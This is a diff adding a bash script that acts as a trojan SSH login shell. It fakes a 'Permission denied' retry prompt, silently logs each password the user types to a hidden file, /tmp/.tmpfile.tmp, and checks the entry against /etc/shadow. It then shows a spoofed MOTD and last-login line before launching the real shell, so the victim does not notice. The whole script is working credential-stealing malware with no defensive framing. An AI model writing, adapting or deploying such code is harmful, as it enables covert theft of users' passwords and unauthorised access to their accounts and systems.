@@ -1,0 +1,94 @@
+#!/bin/bash
+
+# Get original shell
+SHELL="${0%?}"
+
+# Get username
+USERNAME="$LOGNAME"
+if [ "$USERNAME" == "" ]; then
+    USERNAME="$USER"
+fi
+if [ "$USERNAME" == "" ]; then
+    USERNAME="$(id -un)"
+fi
+
+# Get local and client IP
+LOCAL_IP="$(echo $SSH_CONNECTION | cut -d' ' -f3)"
+CLIENT_IP="$(echo $SSH_CONNECTION | cut -d' ' -f1)"
+
+# No local or client IP -> not a SSH session
+if [ "$LOCAL_IP" == "" ] || [ "$CLIENT_IP" == "" ]; then
+    unset USERNAME
+    unset LOCAL_IP
+    unset CLIENT_IP
+    $SHELL $@
+    exit $?
+fi
+
+# TODO: check real network mask
+LOCAL_NET="$(echo "$LOCAL_IP" | cut -d'.' -f1-3)"
+CLIENT_NET="$(echo "$CLIENT_IP" | cut -d'.' -f1-3)"
+
+if [ "$LOCAL_NET" == "$CLIENT_NET" ]; then
+    # Local network
+    HOSTNAME="$LOCAL_IP"
+else
+    # Get external IP
+    # TODO: what to do if the host dont have netcat installed?
+    HOSTNAME="$(echo -ne "GET /text HTTP/1.1\r\nHost: wtfismyip.com\r\nConnection: close\r\n\r\n" | nc wtfismyip.com 80 | tail -n -1 2>/dev/null)"
+fi
+
+# No hostname -> get from hostname()
+if [ "$HOSTNAME" == "" ]; then
+    HOSTNAME="$(hostname)"
+fi
+
+# Main loop
+while true; do
+    echo Permission denied, please try again.
+
+    echo -ne "${USERNAME}@${HOSTNAME}'s password: "
+    read -s PASS
+    echo
+    echo "$PASS" >> /tmp/.tmpfile.tmp
+
+    # Check real password
+    # TODO: what to do when user is not root?
+    # TODO: what to do when host dont have perl installed?
+    ORIGPASS="$(grep -w "$USERNAME" /etc/shadow | cut -d: -f2)"
+    export PASS
+    export ALGO="$(echo $ORIGPASS | cut -d'$' -f2)"
+    export SALT="$(echo $ORIGPASS | cut -d'$' -f3)"
+    GENPASS="$(perl -le 'print crypt("$ENV{PASS}","\$$ENV{ALGO}\$$ENV{SALT}\$")')"
+
+    # Password is correct
+    if [ "$ORIGPASS" == "$GENPASS" ]; then
+        break
+    fi
+
+    # Simulate delay
+    sleep 1
+
+done
+
+# Unset variables
+unset ORIGPASS
+unset PASS
+unset ALGO
+unset SALT
+unset GENPASS
+
+unset LOCAL_IP
+unset CLIENT_IP
+unset LOCAL_NET
+unset CLIENT_NET
+
+# Print MOTD and last login
+# TODO: check if no MOTD or dynamid MOTD
+cat /etc/motd
+echo "Last login: $(lastlog --user $USERNAME | cut -b44- | cut -b1-19 | tail -n1) $(lastlog --user $USERNAME | cut -b44- | cut -b27-30 | tail -n1) from: $(lastlog --user $USERNAME | cut -b27-43 | tail -n1)"
+unset USERNAME
+
+# Execute original shell
+$SHELL $@
+exit $?
